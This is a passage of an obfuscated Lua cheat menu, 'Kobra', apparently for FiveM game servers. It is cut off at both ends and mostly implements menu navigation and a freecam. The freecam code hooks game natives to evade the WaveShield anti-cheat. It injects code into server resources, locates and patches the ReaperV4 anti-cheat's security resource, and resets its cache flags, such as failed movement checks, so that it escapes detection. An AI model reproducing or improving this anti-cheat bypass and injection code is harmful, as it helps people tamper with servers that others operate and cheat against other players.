            ]]);end SetPauseMenuActive(false);v843=1;end end else Wait(157 + 343 );end break;end end end end);v12.ScrollOne=function(v183,v184) local v185=1970 -(49 + 1921) ;local v186;while true do if ((891 -(223 + 667))==v185) then repeat if (v184=="Up") then local v844=0;while true do if (v844==(52 -(51 + 1))) then v15=v15-(1 -0) ;if (v15<1) then v15= #v17;end break;end end elseif (v184=="Down") then local v957=0 -0 ;while true do if (v957==(1125 -(146 + 979))) then v15=v15 + 1 + 0 ;if (v15> #v17) then v15=606 -(311 + 294) ;end break;end end end v186=v186 + (2 -1) ;if (v186>(85 + 115)) then break;end until v17[v15] and (v17[v15].type~="divider")  if v14 then v183:SendMessage({action="keydown",index=v15-1 });end break;end if (v185==0) then if ( not v184 or ( #v17==(1443 -(496 + 947)))) then return;end v186=1358 -(1233 + 125) ;v185=1 + 0 ;end end end;v12.ScrollTwo=function(v187,v188) local v189=0 + 0 ;local v190;while true do if (v189==1) then if (((v190.type=="scrollable") or (v190.type=="scrollable-checkbox")) and v190.values and ( #v190.values>(0 + 0))) then local v745=1645 -(963 + 682) ;while true do if (v745==0) then v190.value=v190.value or (1 + 0) ;if (v188=="Left") then local v1046=1504 -(504 + 1000) ;while true do if (v1046==(0 + 0)) then v190.value=v190.value-1 ;if (v190.value<1) then v190.value= #v190.values;end break;end end elseif (v188=="Right") then local v1242=0 + 0 ;while true do if (v1242==(0 + 0)) then v190.value=v190.value + (1 -0) ;if (v190.value> #v190.values) then v190.value=1 + 0 ;end break;end end end v745=1;end if ((1 + 0)==v745) then v187:UpdateElements(v17);if ((v190.scrollType=="onScroll") and v190.onSelect) then if (v190.type=="scrollable-checkbox") then v190.onSelect(v190.values[v190.value],v190.checked or false );else v190.onSelect(v190.values[v190.value]);end end break;end end elseif ((v190.type=="slider") or (v190.type=="slider-checkbox")) then v190.value=v190.value or v190.min or 0 ;local v887=v190.step or (183 -(156 + 26)) ;if (v188=="Left") then v190.value=math.max(v190.min or 0 ,v190.value-v887 );elseif (v188=="Right") then v190.value=math.min(v190.max or 100 ,v190.value + v887 );end for v959,v960 in pairs(v25) do if ((v960.type=="slider-checkbox") and (type(v960.value)~="nil") and (v960.label==v190.label)) then if (v188=="Left") then v960.value=math.max(v190.min or (0 + 0) ,v190.value-v887 );elseif (v188=="Right") then v960.value=math.min(v190.max or 100 ,v190.value + v887 );else return;end end end v187:UpdateElements(v17);if ((v190.scrollType=="onScroll") and v190.onSelect) then if (v190.type=="slider-checkbox") then v190.onSelect(v190.value,v190.checked or false );else v190.onSelect(v190.value);end end end break;end if (v189==(0 -0)) then v190=v17[v15];if  not v190 then return;end v189=165 -(149 + 15) ;end end end;v12.Enter=function(v191) if ( not v17 or ( #v17==(960 -(890 + 70)))) then return;end local v192=v17[v15];if  not v192 then return;end if  not v24 then return;end if (v192.type=="subMenu") then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v192.label or "Submenu" );if (v192.type=="Server") then v12:UpdateListMenu();end if (v192.categories and (type(v192.categories)=="table") and ( #v192.categories>0)) then local v663=0;while true do if (v663==2) then v191:UpdateElements(v17);return;end if (v663==(117 -(39 + 78))) then v18=v192.categories;v19=483 -(14 + 468) ;v663=2 -1 ;end if (v663==(2 -1)) then v17=v18[v19].tabs or {} ;v15=1 + 0 ;v663=2 + 0 ;end end end if (v192.subTabs and (type(v192.subTabs)=="table") and ( #v192.subTabs>(0 + 0))) then local v664=0 + 0 ;while true do if (v664==(1 + 1)) then v191:UpdateElements(v17);return;end if (v664==(1 -0)) then v17=v192.subTabs;v15=1 + 0 ;v664=6 -4 ;end if (0==v664) then v18=nil;v19=1;v664=1 + 0 ;end end end return;end if ((v192.type=="button") and v192.onSelect and (type(v192.onSelect)=="function")) then local v512=51 -(12 + 39) ;local v513;local v514;while true do if (v512==1) then return;end if (v512==0) then v513,v514=pcall(v192.onSelect);if  not v513 then v191:Debug("red","onSelect error: "   .. tostring(v514) );end v512=1 + 0 ;end end end if ((v192.type=="checkbox") or (v192.type=="scrollable-checkbox") or (v192.type=="slider-checkbox")) then if v192.locked then v191:Notify("error","Kobra","This module has been disabled due to high detection rates!",9286 -6286 );return;end if (type(v192.checked)~="boolean") then v192.checked=true;else v192.checked= not v192.checked;end if (v192.onSelect and (type(v192.onSelect)=="function")) then if (v192.type=="scrollable-checkbox") then local v845=0 -0 ;local v846;local v847;while true do if (v845==(0 + 0)) then v846,v847=pcall(v192.onSelect,v192.values[v192.value],v192.checked);if  not v846 then v191:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v847) );end break;end end elseif (v192.type=="slider-checkbox") then local v961=0;local v962;local v963;while true do if (v961==(0 + 0)) then v962,v963=pcall(v192.onSelect,v192.value,v192.checked);if  not v962 then v191:Debug("red","slider-checkbox onSelect error: "   .. tostring(v963) );end break;end end else local v964=0 -0 ;local v965;local v966;while true do if (0==v964) then v965,v966=pcall(v192.onSelect,v192.checked);if  not v965 then v191:Debug("red","checkbox onSelect error: "   .. tostring(v966) );end break;end end end end v191:UpdateElements(v17);return;end if ((v192.type=="scrollable") or (v192.type=="scrollable-checkbox")) then local v515=0 + 0 ;while true do if (v515==0) then if (v192.values and (type(v192.values)=="table") and ( #v192.values>(0 -0))) then if v192.onSelect then v192.onSelect(v192.values[v192.value]);end end return;end end end if ((v192.type=="slider") or (v192.type=="slider-checkbox")) then local v516=1710 -(1596 + 114) ;while true do if ((0 -0)==v516) then if ((v192.scrollType=="onEnter") and v192.onSelect) then if (v192.type=="slider-checkbox") then v192.onSelect(v192.value,v192.checked or false );else v192.onSelect(v192.value);end end return;end end end end;local v63=false;v12.Backspace=function(v193) if ( #v20>0) then local v517=table.remove(v20);table.remove(v21);v17=v517.menu or v16 ;v18=v517.categories;v19=v517.categoryIndex or (714 -(164 + 549)) ;v15=1;v193:UpdateElements(v17);else v193:HideUI();end end;v12.PrevCategory=function(v194) local v195=0;while true do if (v195==(1438 -(1059 + 379))) then if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19-1 ;v195=1 + 0 ;end if (v195==2) then v15=1;v194:UpdateElements(v17);v195=3;end if ((1 + 0)==v195) then if (v19<(393 -(145 + 247))) then v19= #v18;end v17=v18[v19].tabs or {} ;v195=2 + 0 ;end if (v195==(2 + 1)) then v194:SendMessage({action="keydown",index=v15-1 });break;end end end;v12.NextCategory=function(v196) if ( not v18 or ( #v18==0)) then return;end v19=v19 + (2 -1) ;if (v19> #v18) then v19=1 + 0 ;end v17=v18[v19].tabs or {} ;v15=1 + 0 ;v196:UpdateElements(v17);v196:SendMessage({action="keydown",index=v15-(1 -0) });end;v12.ToggleFreecam=function(v197,v198,v199) if (type(v198)~="boolean") then return;end if v198 then local v519=0;while true do if (v519==0) then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));v519=721 -(254 + 466) ;end if (1==v519) then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000 -(544 + 16) ,function(...) return false, -1;end);MachoHookNative(11673589000000000000 -0 ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000,function(...) return false,false;end);MachoHookNative(10181871000000000000,function(...) return false,0;end);MachoHookNative(12777102000000000000 -(294 + 334) ,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(236 + 17) ,function(...) return false,0;end);MachoHookNative(15349248000000000000 -(1716 + 95) ,function(...) return false,0;end);MachoHookNative(18127728000000000000 -  -15408774 ,function(...) return false,true;end);MachoHookNative(11059360000000000000 -(9 + 8) ,function(...) return false,true;end);_G.KobraFreecamSpeed=v199;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1244,v1245) local v1246=0;local v1247;while true do if ((1 + 0)==v1246) then _G[v1244]=function(...) return v1245(v1247,...);end;break;end if (v1246==(0 -0)) then v1247=_G[v1244];if ( not v1247 or (type(v1247)~="function")) then return;end v1246=1 + 0 ;end end end local function v1165(v1248) local v1249=math.rad(v1248.z);local v1250=math.rad(v1248.x);local v1251=math.abs(math.cos(v1250));return vector3( -math.sin(v1249) * v1251 ,math.cos(v1249) * v1251 ,math.sin(v1250));end local function v1166(v1252) local v1253=0;local v1254;while true do if (0==v1253) then v1254=math.rad(v1252.z);return vector3(math.cos(v1254),math.sin(v1254),0 -0 );end end end local function v1167(v1255,v1256,v1257) local v1258=0 -0 ;while true do if (v1258==(0 + 0)) then if (v1255<v1256) then return v1256;end if (v1255>v1257) then return v1257;end v1258=1;end if (v1258==(1 + 0)) then return v1255;end end end hNative("RotationToDirection",function(v1259,...) return v1259(...);end);hNative("GetRightVector",function(v1260,...) return v1260(...);end);hNative("Clamp",function(v1261,...) return v1261(...);end);hNative("CreateThread",function(v1262,...) return v1262(...);end);hNative("Wait",function(v1263,...) return v1263(...);end);hNative("IsVehicleSeatFree",function(v1264,...) return v1264(...);end);hNative("PlayerPedId",function(v1265,...) return v1265(...);end);hNative("GetEntityCoords",function(v1266,...) return v1266(...);end);hNative("CreateCam",function(v1267,...) return v1267(...);end);hNative("DoesCamExist",function(v1268,...) return v1268(...);end);hNative("SetCamCoord",function(v1269,...) return v1269(...);end);hNative("SetCamRot",function(v1270,...) return v1270(...);end);hNative("RenderScriptCams",function(v1271,...) return v1271(...);end);hNative("DestroyCam",function(v1272,...) return v1272(...);end);hNative("SetFocusEntity",function(v1273,...) return v1273(...);end);hNative("SetTextFont",function(v1274,...) return v1274(...);end);hNative("SetTextProportional",function(v1275,...) return v1275(...);end);hNative("SetTextScale",function(v1276,...) return v1276(...);end);hNative("SetTextDropShadow",function(v1277,...) return v1277(...);end);hNative("SetTextEdge",function(v1278,...) return v1278(...);end);hNative("SetTextOutline",function(v1279,...) return v1279(...);end);hNative("SetTextCentre",function(v1280,...) return v1280(...);end);hNative("SetTextColour",function(v1281,...) return v1281(...);end);hNative("BeginTextCommandDisplayText",function(v1282,...) return v1282(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1283,...) return v1283(...);end);hNative("EndTextCommandDisplayText",function(v1284,...) return v1284(...);end);hNative("GetCamCoord",function(v1285,...) return v1285(...);end);hNative("GetCamRot",function(v1286,...) return v1286(...);end);hNative("IsControlPressed",function(v1287,...) return v1287(...);end);hNative("GetDisabledControlNormal",function(v1288,...) return v1288(...);end);hNative("TaskStandStill",function(v1289,...) return v1289(...);end);hNative("SetFocusPosAndVel",function(v1290,...) return v1290(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1291,...) return v1291(...);end);hNative("GetShapeTestResult",function(v1292,...) return v1292(...);end);hNative("IsControlJustPressed",function(v1293,...) return v1293(...);end);hNative("IsDisabledControlJustPressed",function(v1294,...) return v1294(...);end);hNative("IsEntityAVehicle",function(v1295,...) return v1295(...);end);hNative("TaskWarpPedIntoVehicle",function(v1296,...) return v1296(...);end);hNative("SetEntityCoords",function(v1297,...) return v1297(...);end);hNative("GiveWeaponToPed",function(v1298,...) return v1298(...);end);hNative("SetCurrentPedWeapon",function(v1299,...) return v1299(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1300,...) return v1300(...);end);local v1168=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1168.x,v1168.y,v1168.z + (366 -(326 + 38)) );SetCamRot(_G.KobraFreecamObject,0 -0 ,0,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(620 -(47 + 573) );if _G.KobraFreecamObject then local v1396=0 + 0 ;local v1397;local v1398;local v1399;local v1400;local v1401;local v1402;local v1403;local v1404;local v1405;local v1406;local v1407;local v1408;local v1409;while true do if (v1396==(12 -9)) then if IsControlPressed(0 -0 ,32) then local v1607=0;while true do if (v1607==0) then v1403=v1403 + (v1401.x * v1400) ;v1404=v1404 + (v1401.y * v1400) ;v1607=1665 -(1269 + 395) ;end if ((493 -(76 + 416))==v1607) then v1405=v1405 + (v1401.z * v1400) ;break;end end end if IsControlPressed(443 -(319 + 124) ,75 -42 ) then v1403=v1403-(v1401.x * v1400) ;v1404=v1404-(v1401.y * v1400) ;v1405=v1405-(v1401.z * v1400) ;end if IsControlPressed(0,34) then v1403=v1403-(v1402.x * v1400) ;v1404=v1404-(v1402.y * v1400) ;end v1396=1011 -(564 + 443) ;end if (v1396==5) then SetCamCoord(_G.KobraFreecamObject,v1397.x + v1403 ,v1397.y + v1404 ,v1397.z + v1405 );v1406=GetDisabledControlNormal(0 -0 ,459 -(337 + 121) );v1407=GetDisabledControlNormal(0 -0 ,2);v1396=19 -13 ;end if (4==v1396) then if IsControlPressed(0,1946 -(1261 + 650) ) then local v1608=0;while true do if (v1608==0) then v1403=v1403 + (v1402.x * v1400) ;v1404=v1404 + (v1402.y * v1400) ;break;end end end if IsControlPressed(0 + 0 ,22) then v1405=v1405 + v1400 ;end if IsControlPressed(0 -0 ,36) then v1405=v1405-v1400 ;end v1396=1822 -(772 + 1045) ;end if (v1396==(1 + 5)) then v1408=v1167(v1398.x-(v1407 * (149 -(102 + 42))) , -89,1933 -(1524 + 320) );v1409=v1398.z-(v1406 * 5) ;SetCamRot(_G.KobraFreecamObject,v1408,v1398.y,v1409,1272 -(1049 + 221) );break;end if (v1396==(156 -(18 + 138))) then v1397=GetCamCoord(_G.KobraFreecamObject);v1398=GetCamRot(_G.KobraFreecamObject,2);v1399=_G.KobraFreecamSpeed or 0.25 ;v1396=2 -1 ;end if (v1396==(1103 -(67 + 1035))) then v1400=(IsControlPressed(348 -(136 + 212) ,89 -68 ) and (v1399 + 1)) or v1399 ;v1401=v1165(v1398);v1402=v1166(v1398);v1396=2;end if (v1396==(2 + 0)) then v1403,v1404,v1405=0 + 0 ,1604 -(240 + 1364) ,1082 -(1050 + 32) ;TaskStandStill(PlayerPedId(),35 -25 );SetFocusPosAndVel(v1397.x,v1397.y,v1397.z,0 + 0 ,0,1055 -(331 + 724) );v1396=1 + 2 ;end end end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v199   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");local function v1017() local v1047=0;local v1048;local v1049;local v1050;local v1051;local v1052;local v1053;local v1054;local v1055;while true do if (v1047==(646 -(269 + 375))) then for v1377=725 -(267 + 458) ,v1052-(1 + 0)  do local v1378=0 -0 ;local v1379;while true do if (v1378==(818 -(667 + 151))) then v1379=GetResourceByFindIndex(v1377);if (v1379 and (v1379~="")) then table.insert(v1053,v1379);end break;end end end if ( #v1053==(1497 -(1410 + 87))) then return;end v1054=0;v1055=nil;v1047=3;end if (v1047==1) then v1051=tonumber(v1050);if  not v1051 then return;end v1052=GetNumResources() or (1897 -(1504 + 393)) ;v1053={};v1047=5 -3 ;end if ((0 -0)==v1047) then v1048=false;v1049=nil;function v1049(v1380,v1381) v1381=v1381 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1380=v1380   .. v1381 ;local v1382=6177 -(461 + 335) ;for v1410=1, #v1380 do local v1411=0 + 0 ;local v1412;while true do if (v1411==(1761 -(1730 + 31))) then v1412=string.byte(v1380,v1410);v1382=(v1382 * 33)~v1412 ;break;end end end return v1382;end v1050=GetConvar("reaper_security_resource","");v1047=1668 -(728 + 939) ;end if (v1047==(10 -7)) then for v1383,v1384 in ipairs(v1053) do v1054=v1054 + 1 ;if (v1049(v1384)==v1051) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1384 );v1055=v1384;break;end local v1385=v1384:gsub("[-_]","");if ((v1385~=v1384) and (v1049(v1385)==v1051)) then v1055=v1385;break;end if ((v1054%(101 -51))==0) then Wait(0 -0 );end end if v1055 then return v1055;end break;end end end local v1018=v1017();MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(1318 -(138 + 930) );if v1018 then MachoInjectResource(v1018,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;end _G.KobraFreecamSpeed=v199;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1056,v1057) local v1058=0;local v1059;while true do if (v1058==(1 + 0)) then _G[v1056]=function(...) return v1057(v1059,...);end;break;end if (v1058==0) then v1059=_G[v1056];if ( not v1059 or (type(v1059)~="function")) then return;end v1058=1 + 0 ;end end end local function v1019(v1060) local v1061=0 + 0 ;local v1062;local v1063;local v1064;while true do if (v1061==(4 -3)) then v1064=math.abs(math.cos(v1063));return vector3( -math.sin(v1062) * v1064 ,math.cos(v1062) * v1064 ,math.sin(v1063));end if (v1061==0) then v1062=math.rad(v1060.z);v1063=math.rad(v1060.x);v1061=1767 -(459 + 1307) ;end end end local function v1020(v1065) local v1066=0;local v1067;while true do if (v1066==(1870 -(474 + 1396))) then v1067=math.rad(v1065.z);return vector3(math.cos(v1067),math.sin(v1067),0 -0 );end end end local function v1021(v1068,v1069,v1070) local v1071=0 + 0 ;while true do if (v1071==(0 + 0)) then if (v1068<v1069) then return v1069;end if (v1068>v1070) then return v1070;end v1071=1;end if (v1071==(2 -1)) then return v1068;end end end hNative("RotationToDirection",function(v1072,...) return v1072(...);end);hNative("GetRightVector",function(v1073,...) return v1073(...);end);hNative("Clamp",function(v1074,...) return v1074(...);end);hNative("CreateThread",function(v1075,...) return v1075(...);end);hNative("Wait",function(v1076,...) return v1076(...);end);hNative("IsVehicleSeatFree",function(v1077,...) return v1077(...);end);hNative("PlayerPedId",function(v1078,...) return v1078(...);end);hNative("GetEntityCoords",function(v1079,...) return v1079(...);end);hNative("CreateCam",function(v1080,...) return v1080(...);end);hNative("DoesCamExist",function(v1081,...) return v1081(...);end);hNative("SetCamCoord",function(v1082,...) return v1082(...);end);hNative("SetCamRot",function(v1083,...) return v1083(...);end);hNative("RenderScriptCams",function(v1084,...) return v1084(...);end);hNative("DestroyCam",function(v1085,...) return v1085(...);end);hNative("SetFocusEntity",function(v1086,...) return v1086(...);end);hNative("SetTextFont",function(v1087,...) return v1087(...);end);hNative("SetTextProportional",function(v1088,...) return v1088(...);end);hNative("SetTextScale",function(v1089,...) return v1089(...);end);hNative("SetTextDropShadow",function(v1090,...) return v1090(...);end);hNative("SetTextEdge",function(v1091,...) return v1091(...);end);hNative("SetTextOutline",function(v1092,...) return v1092(...);end);hNative("SetTextCentre",function(v1093,...) return v1093(...);end);hNative("SetTextColour",function(v1094,...) return v1094(...);end);hNative("BeginTextCommandDisplayText",function(v1095,...) return v1095(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1096,...) return v1096(...);end);hNative("EndTextCommandDisplayText",function(v1097,...) return v1097(...);end);hNative("GetCamCoord",function(v1098,...) return v1098(...);end);hNative("GetCamRot",function(v1099,...) return v1099(...);end);hNative("IsControlPressed",function(v1100,...) return v1100(...);end);hNative("GetDisabledControlNormal",function(v1101,...) return v1101(...);end);hNative("TaskStandStill",function(v1102,...) return v1102(...);end);hNative("SetFocusPosAndVel",function(v1103,...) return v1103(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1104,...) return v1104(...);end);hNative("GetShapeTestResult",function(v1105,...) return v1105(...);end);hNative("IsControlJustPressed",function(v1106,...) return v1106(...);end);hNative("IsDisabledControlJustPressed",function(v1107,...) return v1107(...);end);hNative("IsEntityAVehicle",function(v1108,...) return v1108(...);end);hNative("TaskWarpPedIntoVehicle",function(v1109,...) return v1109(...);end);hNative("SetEntityCoords",function(v1110,...) return v1110(...);end);hNative("GiveWeaponToPed",function(v1111,...) return v1111(...);end);hNative("SetCurrentPedWeapon",function(v1112,...) return v1112(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1113,...) return v1113(...);end);local v1022=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v1022.x,v1022.y,v1022.z + 1 + 1 );SetCamRot(_G.KobraFreecamObject,0,0 -0 ,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,0 -0 ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(591 -(562 + 29) );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1317=0;local v1318;local v1319;local v1320;local v1321;local v1322;local v1323;local v1324;local v1325;local v1326;local v1327;local v1328;local v1329;local v1330;while true do if (v1317==(2 + 0)) then v1324,v1325,v1326=0,1419 -(374 + 1045) ,0 + 0 ;TaskStandStill(PlayerPedId(),10);SetFocusPosAndVel(v1318.x,v1318.y,v1318.z,0 -0 ,638 -(448 + 190) ,0 + 0 );v1317=3;end if (v1317==(3 + 2)) then SetCamCoord(_G.KobraFreecamObject,v1318.x + v1324 ,v1318.y + v1325 ,v1318.z + v1326 );v1327=GetDisabledControlNormal(0 + 0 ,3 -2 );v1328=GetDisabledControlNormal(0 -0 ,1496 -(1307 + 187) );v1317=6;end if (v1317==(3 -2)) then v1321=(IsControlPressed(0,49 -28 ) and (v1320 + (2 -1))) or v1320 ;v1322=v1019(v1319);v1323=v1020(v1319);v1317=685 -(232 + 451) ;end if (6==v1317) then v1329=v1021(v1319.x-(v1328 * 5) , -(85 + 4),79 + 10 );v1330=v1319.z-(v1327 * (569 -(510 + 54))) ;SetCamRot(_G.KobraFreecamObject,v1329,v1319.y,v1330,2);break;end if (v1317==4) then if IsControlPressed(0 -0 ,71 -(13 + 23) ) then local v1513=0 -0 ;while true do if (v1513==(0 -0)) then v1324=v1324 + (v1323.x * v1321) ;v1325=v1325 + (v1323.y * v1321) ;break;end end end if IsControlPressed(0 -0 ,22) then v1326=v1326 + v1321 ;end if IsControlPressed(0,1124 -(830 + 258) ) then v1326=v1326-v1321 ;end v1317=17 -12 ;end if (v1317==(0 + 0)) then v1318=GetCamCoord(_G.KobraFreecamObject);v1319=GetCamRot(_G.KobraFreecamObject,2);v1320=_G.KobraFreecamSpeed or (0.25 + 0) ;v1317=1;end if (v1317==(1444 -(860 + 581))) then if IsControlPressed(0 -0 ,26 + 6 ) then local v1514=0;while true do if (v1514==(242 -(237 + 4))) then v1326=v1326 + (v1322.z * v1321) ;break;end if (v1514==(0 -0)) then v1324=v1324 + (v1322.x * v1321) ;v1325=v1325 + (v1322.y * v1321) ;v1514=2 -1 ;end end end if IsControlPressed(0 -0 ,33) then local v1515=0 + 0 ;while true do if (v1515==(1 + 0)) then v1326=v1326-(v1322.z * v1321) ;break;end if (v1515==(0 -0)) then v1324=v1324-(v1322.x * v1321) ;v1325=v1325-(v1322.y * 